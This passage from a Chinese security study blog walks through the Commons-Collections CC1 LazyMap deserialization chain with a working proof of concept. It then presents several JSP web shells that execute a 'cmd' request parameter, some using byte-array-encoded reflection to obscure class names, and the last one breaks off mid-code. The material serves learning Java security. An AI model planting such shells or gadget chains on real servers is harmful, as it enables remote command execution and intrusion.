map.get(key);<br>}<br></code></pre></td></tr></table></figure><p>现在我们找到了最底层的出发点，现在向上查看对<code>LayMap.get()</code>的调用，可以发现有一大堆，直接看看<code>ysoserial</code>里面是怎么设计的，还是使用了<code>AnnotationInvocationHandler</code>这个类，但是并不是在它的<code>readObject</code>函数中了，搜索一下<code>get</code>，在77行的位置，<code>invoke</code>函数中调用了Map类的<code>get</code>函数，而<code>LazyMap</code>显然是继承<code>Map</code>类的。</p><p>下一个问题是，如何使用<code>AnnotationInvocationHandler</code>的<code>invoke</code>函数，从这个类的注释中可以发现，它是对注解调用处理的动态代理实现。关于动态代理可以看看JavaSec的这篇文章，<a href="https://www.javasec.org/javase/DynamicProxy/DynamicProxy.html">Java动态代理</a></p><p>在<code>ysoserial</code>中也是使用了动态代理的方法进行的构造，创建动态代理类会使用到<code>java.lang.reflect.Proxy</code>类和<code>java.lang.reflect.InvocationHandler</code>接口。<code>java.lang.reflect.Proxy</code>主要用于生成动态代理类<code>Class</code>、创建代理类实例。</p><p>创建动态代理实例代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Map</span> <span class="hljs-variable">proxyMap</span> <span class="hljs-operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="hljs-keyword">new</span><br><span class="hljs-title class_">Class</span>[] {Map.class}, handler);<br></code></pre></td></tr></table></figure><p><code>Proxy.newProxyInstance</code>的第一个参数是<code>ClassLoader</code>，我们用默认的即可；第二个参数是我们需要代理的对象集合；第三个参数是一个实现了<code>InvocationHandler</code>接口的对象，里面包含了具体代理的逻辑。<strong>被代理的接口类通过调用动态代理处理类(<code>InvocationHandler</code>)的<code>invoke</code>方法获取方法执行结果</strong>。</p><p>根据构造的需要，要触发<code>AnnotationInvocationHandler</code>的<code>invoke</code>，对其进行动态代理，再调用任意函数就可以了，调用函数简单，反序列化自动会调用<code>Map</code>的一些函数。</p><p>所以根据<code>TransformMap</code>的链子我们可以写出<code>lazyMap</code>的链子：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs java">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception {<br>        <span class="hljs-comment">// 第一层</span><br>        Transformer[] tfs = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]{<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">"getMethod"</span>,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]{String.class, Class[].class},<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]{<span class="hljs-string">"getRuntime"</span>, <span class="hljs-literal">null</span>}),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">"invoke"</span>,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]{Object.class, Object[].class},<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]{<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>}),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">"exec"</span>,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]{String.class},<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]{<span class="hljs-string">"calc"</span>})<br>        };<br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(tfs);<br>        Map&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map.put(<span class="hljs-string">"value"</span>, <span class="hljs-string">"3xsh0re"</span>);<br>        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,transformerChain);<br><span class="hljs-comment">//        获取类</span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-comment">//        对Map创建代理,使用AnnotationInvocationHandler进行代理</span><br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> (InvocationHandler) constructor.newInstance(Target.class,lazyMap);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">proxyMap</span> <span class="hljs-operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] {Map.class}, handler);<br><span class="hljs-comment">//        对proxyMap进行再封装,因为我们需要的是AnnotationInvocationHandler的readObject</span><br>        handler = (InvocationHandler) constructor.newInstance(Target.class,proxyMap);<br><br><span class="hljs-comment">//        测试</span><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>        oos.writeObject(handler);<br>        oos.close();<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(barr.toByteArray()));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (Object)ois.readObject();<br>    }<br>}<br></code></pre></td></tr></table></figure><p>我自己的payload在调试过程中会弹出很多次计算器，因为被代理后，只要使用<code>Map</code>相关的函数就会到<code>invoke</code>。调试器会调用一些toString之类的方法，导致不经意间触发了 命令。<code>ysoserial</code>对此有一些处理，它在POC的最后才将执行命令的<code>Transformer</code>数组设置到<code>transformerChain</code>中，原因是避免本地生成序列化流的程序执行到命令。可以发现<code>ysoserial</code>实现了一个工具类去处理这种情况。</p><img src="/2024/08/13/CC1%E9%93%BElazyMap/image-20240913202953660.png" class="" title="image-20240913202953660"><p>最后来捋一捋这个逻辑：</p><p><code>AnnotationInvocationHandler</code>封装<code>proxyMap</code>从而可以被序列化</p><p><code>AnnotationInvocationHandler</code>代理<code>Map.class</code>从而可以触发<code>invoke</code>函数</p><p>构造的<code>AnnotationInvocationHandler</code>实例中，<code>lazyMap</code>作为成员变量被传入，在<code>invoke</code>函数中调用<code>get</code>函数</p><p>在<code>lazyMap.get()</code>中调用<code>transform</code></p>]]></content>
    
    
    <categories>
      
      <category>漏洞分析</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞分析</tag>
      
      <tag>Java安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JSPWebShell小记</title>
    <link href="/2024/08/09/JSPWebShell%E5%B0%8F%E8%AE%B0/"/>
    <url>/2024/08/09/JSPWebShell%E5%B0%8F%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<p>学习JavaSec中有这一部分，故系统记录一下。</p><span id="more"></span><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>首先，IDEA肯定是准备好，这个不细说了，破解版各个公众号都有。</p><p>然后下载Tomcat作为Web服务，因为JSP是动态页面，必须要有容器，我自己在官网下的Tomcat9，这里给一个7版本的下载地址。</p><p><a href="https://archive.apache.org/dist/tomcat/tomcat-7/v7.0.82/bin/apache-tomcat-7.0.82.zip">Tomcat-7.0.82</a></p><p>解压缩后记住地址，新建一个IDEA的项目，具体配置见这篇文章：<a href="https://www.2it.club/code/java/10637.html">在IDEA中搭建JSP环境</a></p><p>写好了一个JSP🐎的时候发现会报错无法解决函数的问题，是因为没有导入相关的jar包。</p><p><code>ctrl+shift+alt+s</code>打开项目配置，找到<code>lib</code>，添加Tomcat的相关依赖。<a href="https://commons.apache.org/">common包官网</a></p><img src="/2024/08/09/JSPWebShell%E5%B0%8F%E8%AE%B0/image-20240909160958795.png" class="" title="image-20240909160958795"><p>当运行Tomcat的时候，控制台中文出现了乱码，解决方案：<code>ctrl+alt+s</code>打开系统设置，进入控制台选项，修改编码为UTF-8</p><img src="/2024/08/09/JSPWebShell%E5%B0%8F%E8%AE%B0/image-20240909161912300.png" class="" title="image-20240909161912300"><p>最后就可以正常运行了</p><h3 id="JSPWebShell基础"><a href="#JSPWebShell基础" class="headerlink" title="JSPWebShell基础"></a>JSPWebShell基础</h3><p>JSP 语法其实非常简单，我们只需要将 Java 语句使用 <code>&lt;%JavaCode%&gt;</code> 进行包裹。</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%@ page contentType=<span class="hljs-string">"text/html;charset=UTF-8"</span> language=<span class="hljs-string">"java"</span> %&gt;<br>&lt;%<br>    out.println(<span class="hljs-string">"test"</span>);<br>%&gt;<br></code></pre></td></tr></table></figure><p>本质上还是在写Java代码，这里给出一个最基础的🐎：利用<code>Runtime</code>类的<code>exec</code>执行系统命令。</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%@ page contentType=<span class="hljs-string">"text/html;charset=UTF-8"</span> language=<span class="hljs-string">"java"</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">"java.io.ByteArrayOutputStream"</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">"java.io.InputStream"</span> %&gt;<br>&lt;%<br>    <span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(request.getParameter(<span class="hljs-string">"cmd"</span>)).getInputStream();<br>    <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>    <span class="hljs-type">byte</span>[] b = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">2048</span>];<br>    <span class="hljs-type">int</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> -<span class="hljs-number">1</span>;<br><br>    <span class="hljs-keyword">while</span> ((a = in.read(b)) != -<span class="hljs-number">1</span>) {<br>        baos.write(b, <span class="hljs-number">0</span>, a);<br>    }<br>    out.write(<span class="hljs-string">"&lt;pre&gt;"</span> + <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(baos.toByteArray()) + <span class="hljs-string">"&lt;/pre&gt;"</span>);<br>%&gt;<br></code></pre></td></tr></table></figure><p><code>exec</code>方法并不是命令执行的最终点，执行逻辑大致是：</p><ul><li><code>Runtime.exec("whoami")</code></li><li><code>java.lang.ProcessBuilder.start()</code></li><li><code>new java.lang.UNIXProcess("whoami")</code></li><li><code>UNIXProcess</code>构造方法中调用了<code>forkAndExec("whoami")</code>native方法。</li><li><code>forkAndExec</code>调用操作系统级别<code>fork-&gt;exec(*nix)/CreateProcess(Windows)</code>执行命令并返回<code>fork/CreateProcess</code>的<code>PID</code>。</li></ul><h3 id="ProcessBuilder命令执行"><a href="#ProcessBuilder命令执行" class="headerlink" title="ProcessBuilder命令执行"></a>ProcessBuilder命令执行</h3><p>学习<code>Runtime</code>命令执行的时候，其最终<code>exec</code>方法会调用<code>ProcessBuilder</code>来执行本地命令，那么我们只需跟踪下Runtime的exec方法就可以知道如何使用<code>ProcessBuilder</code>来执行系统命令了。</p><p><strong>process_builder.jsp命令执行测试</strong></p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%@ page contentType=<span class="hljs-string">"text/html;charset=UTF-8"</span> language=<span class="hljs-string">"java"</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">"java.io.ByteArrayOutputStream"</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">"java.io.InputStream"</span> %&gt;<br>&lt;%<br>    <span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(request.getParameterValues(<span class="hljs-string">"cmd"</span>)).start().getInputStream();<br>    <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>    <span class="hljs-type">byte</span>[] b = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>    <span class="hljs-type">int</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> -<span class="hljs-number">1</span>;<br><br>    <span class="hljs-keyword">while</span> ((a = in.read(b)) != -<span class="hljs-number">1</span>) {<br>        baos.write(b, <span class="hljs-number">0</span>, a);<br>    }<br><br>    out.write(<span class="hljs-string">"&lt;pre&gt;"</span> + <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(baos.toByteArray()) + <span class="hljs-string">"&lt;/pre&gt;"</span>);<br>%&gt;<br></code></pre></td></tr></table></figure><h3 id="利用反射执行系统命令"><a href="#利用反射执行系统命令" class="headerlink" title="利用反射执行系统命令"></a>利用反射执行系统命令</h3><p>既然是Java代码，当然是可以直接使用反射来执行<code>Runtime</code>类的函数的。 </p><p>这里我通过字节转成字符串来反射获取类和函数，并且这里我没有去实例化<code>Runtime</code>类，直接获取<code>getRuntime</code>这个函数来达到实例化的目的</p><img src="/2024/08/09/JSPWebShell%E5%B0%8F%E8%AE%B0/image-20240909174827185.png" class="" title="image-20240909174827185"><p>通过连续两次执行<code>invoke()</code>最终得到执行结果。</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%@ page contentType=<span class="hljs-string">"text/html;charset=UTF-8"</span> language=<span class="hljs-string">"java"</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">"java.io.ByteArrayOutputStream"</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">"java.io.InputStream"</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">"java.lang.reflect.Method"</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">"java.lang.reflect.Constructor"</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">"java.util.Scanner"</span> %&gt;<br>&lt;%<br>    <span class="hljs-type">String</span> <span class="hljs-variable">str</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">"cmd"</span>);<br>    <span class="hljs-comment">// 定义"java.lang.Runtime"字符串变量</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">rt</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[]{<span class="hljs-number">106</span>, <span class="hljs-number">97</span>, <span class="hljs-number">118</span>, <span class="hljs-number">97</span>, <span class="hljs-number">46</span>, <span class="hljs-number">108</span>, <span class="hljs-number">97</span>, <span class="hljs-number">110</span>, <span class="hljs-number">103</span>, <span class="hljs-number">46</span>, <span class="hljs-number">82</span>, <span class="hljs-number">117</span>, <span class="hljs-number">110</span>, <span class="hljs-number">116</span>, <span class="hljs-number">105</span>, <span class="hljs-number">109</span>, <span class="hljs-number">101</span>});<br>    <span class="hljs-comment">// 反射java.lang.Runtime类获取Class对象</span><br>    Class&lt;?&gt; c = Class.forName(rt);<br>    <span class="hljs-comment">// 反射获取Runtime类的getRuntime方法</span><br>    <span class="hljs-type">Method</span> <span class="hljs-variable">m1</span> <span class="hljs-operator">=</span> c.getMethod(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[]{<span class="hljs-number">103</span>, <span class="hljs-number">101</span>, <span class="hljs-number">116</span>, <span class="hljs-number">82</span>, <span class="hljs-number">117</span>, <span class="hljs-number">110</span>, <span class="hljs-number">116</span>, <span class="hljs-number">105</span>, <span class="hljs-number">109</span>, <span class="hljs-number">101</span>}));<br>    <span class="hljs-comment">// 反射获取Runtime类的exec方法</span><br>    <span class="hljs-type">Method</span> <span class="hljs-variable">m2</span> <span class="hljs-operator">=</span> c.getMethod(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[]{<span class="hljs-number">101</span>, <span class="hljs-number">120</span>, <span class="hljs-number">101</span>, <span class="hljs-number">99</span>}), String.class);<br>    <span class="hljs-comment">// 反射调用Runtime.getRuntime().exec(xxx)方法</span><br>    <span class="hljs-type">Object</span> <span class="hljs-variable">obj2</span> <span class="hljs-operator">=</span> m2.invoke(m1.invoke(<span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]{}), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]{str});<br>    <span class="hljs-comment">// 反射获取Process类的getInputStream方法</span><br>    <span class="hljs-type">Method</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> obj2.getClass().getMethod(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[]{<span class="hljs-number">103</span>, <span class="hljs-number">101</span>, <span class="hljs-number">116</span>, <span class="hljs-number">73</span>, <span class="hljs-number">110</span>, <span class="hljs-number">112</span>, <span class="hljs-number">117</span>, <span class="hljs-number">116</span>, <span class="hljs-number">83</span>, <span class="hljs-number">116</span>, <span class="hljs-number">114</span>, <span class="hljs-number">101</span>, <span class="hljs-number">97</span>, <span class="hljs-number">109</span>}));<br>    m.setAccessible(<span class="hljs-literal">true</span>);<br><br>    <span class="hljs-comment">// 获取命令执行结果的输入流对象：p.getInputStream()并使用Scanner按行切割成字符串</span><br>    <span class="hljs-type">Scanner</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>((InputStream) m.invoke(obj2, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]{})).useDelimiter(<span class="hljs-string">"\\A"</span>);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> s.hasNext() ? s.next() : <span class="hljs-string">""</span>;<br>    out.println(result);<br>%&gt;<br></code></pre></td></tr></table></figure><h3 id="NIXProcess-ProcessImpl"><a href="#NIXProcess-ProcessImpl" class="headerlink" title="NIXProcess/ProcessImpl"></a>NIXProcess/ProcessImpl</h3><p><code>ProcessBuilder</code>在实现时调用了<code>ProcessImpl</code></p><img src="/2024/08/09/JSPWebShell%E5%B0%8F%E8%AE%B0/image-20240910103730593.png" class="" title="image-20240910103730593"><p><code>UNIXProcess</code>和<code>ProcessImpl</code>可以理解本就是一个东西，因为在JDK9的时候把<code>UNIXProcess</code>合并到了<code>ProcessImpl</code>当中了,参考<a href="https://hg.openjdk.java.net/jdk-updates/jdk9u/jdk/rev/98eb910c9a97">changeset 11315:98eb910c9a97</a>。</p><p><code>UNIXProcess</code>和<code>ProcessImpl</code>其实就是最终调用<code>native</code>执行系统命令的类，这个类提供了一个叫<code>forkAndExec</code>的native方法，如方法名所述主要是通过<code>fork&amp;exec</code>来执行本地系统命令。</p><p><code>UNIXProcess</code>类的<code>forkAndExec</code>示例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">native</span> <span class="hljs-type">int</span> <span class="hljs-title function_">forkAndExec</span><span class="hljs-params">(<span class="hljs-type">int</span> mode, <span class="hljs-type">byte</span>[] helperpath,</span><br><span class="hljs-params">                                   <span class="hljs-type">byte</span>[] prog,</span><br><span class="hljs-params">                                   <span class="hljs-type">byte</span>[] argBlock, <span class="hljs-type">int</span> argc,</span><br><span class="hljs-params">                                   <span class="hljs-type">byte</span>[] envBlock, <span class="hljs-type">int</span> envc,</span><br><span class="hljs-params">                                   <span class="hljs-type">byte</span>[] dir,</span><br><span class="hljs-params">                                   <span class="hljs-type">int</span>[] fds,</span><br><span class="hljs-params">                                   <span class="hljs-type">boolean</span> redirectErrorStream)</span><br>        <span class="hljs-keyword">throws</span> IOException;<br></code></pre></td></tr></table></figure><p>最终执行的<code>Java_java_lang_ProcessImpl_forkAndExec</code>完整代码:<a href="https://github.com/unofficial-openjdk/openjdk/blob/e59bd5b27066bb2eb77828110ee585b1598ba636/src/java.base/unix/native/libjava/ProcessImpl_md.c">ProcessImpl_md.c</a></p><h3 id="反射UNIXProcess-ProcessImpl执行本地命令"><a href="#反射UNIXProcess-ProcessImpl执行本地命令" class="headerlink" title="反射UNIXProcess/ProcessImpl执行本地命令"></a>反射UNIXProcess/ProcessImpl执行本地命令</h3><p>这里JavaSec的指导书里面只写了Linux的Shell，我这里写一下Win下的。</p><p>首先我们需要知道Win系统下ProcessImpl是如何执行的，那么我们可以使用前面ProcessBuilder的Shell，然后在<code>new ProcessBuilder</code>那里打上断点，然后启动Tomcat进行调试，然后我们步进到<code>PrcocessImpl.java</code>文件，在其322行的位置打上断点，直接继续运行，可以看到此时<code>ProcessImpl</code>的构造函数的参数是多少，然后我们在WebShell里面仿照构造就行了。</p><img src="/2024/08/09/JSPWebShell%E5%B0%8F%E8%AE%B0/image-20240910152220961.png" class=""><p>最后的代码如下：</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;html&gt;<br>&lt;head&gt;<br>    &lt;title&gt;WinRefProcessImplShell&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;%@ page contentType=<span class="hljs-string">"text/html;charset=UTF-8"</span> language=<span class="hljs-string">"java"</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">"java.io.*"</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">"java.lang.reflect.Constructor"</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">"java.lang.reflect.Method"</span> %&gt;<br>&lt;%!<br>    InputStream <span class="hljs-title function_">start</span><span class="hljs-params">(String[] cmds)</span> <span class="hljs-keyword">throws</span> Exception {<br>        <span class="hljs-comment">// java.lang.ProcessImpl</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">processClass</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[]{<span class="hljs-number">106</span>, <span class="hljs-number">97</span>, <span class="hljs-number">118</span>, <span class="hljs-number">97</span>, <span class="hljs-number">46</span>, <span class="hljs-number">108</span>, <span class="hljs-number">97</span>, <span class="hljs-number">110</span>, <span class="hljs-number">103</span>, <span class="hljs-number">46</span>, <span class="hljs-number">80</span>, <span class="hljs-number">114</span>, <span class="hljs-number">111</span>, <span class="hljs-number">99</span>, <span class="hljs-number">101</span>, <span class="hljs-number">115</span>, <span class="hljs-number">115</span>, <span class="hljs-number">73</span>, <span class="hljs-number">109</span>, <span class="hljs-number">112</span>, <span class="hljs-number">108</span>});<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-comment">// 反射创建ProcessImpl</span><br>        clazz = Class.forName(processClass);<br>        <span class="hljs-comment">// 获取UNIXProcess或者ProcessImpl的构造方法</span><br>        Constructor&lt;?&gt; constructor = clazz.getDeclaredConstructors()[<span class="hljs-number">0</span>];<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-keyword">assert</span> cmds != <span class="hljs-literal">null</span> &amp;&amp; cmds.length &gt; <span class="hljs-number">0</span>;<br><br>        <span class="hljs-type">FileInputStream</span>  <span class="hljs-variable">f0</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">f1</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">f2</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-comment">// In theory, close() can throw IOException</span><br>        <span class="hljs-comment">// (although it is rather unlikely to happen here)</span><br>        <span class="hljs-keyword">try</span> {<br>            <span class="hljs-keyword">if</span> (f0 != <span class="hljs-literal">null</span>) f0.close();<br>        } <span class="hljs-keyword">finally</span> {<br>            <span class="hljs-keyword">try</span> {<br>    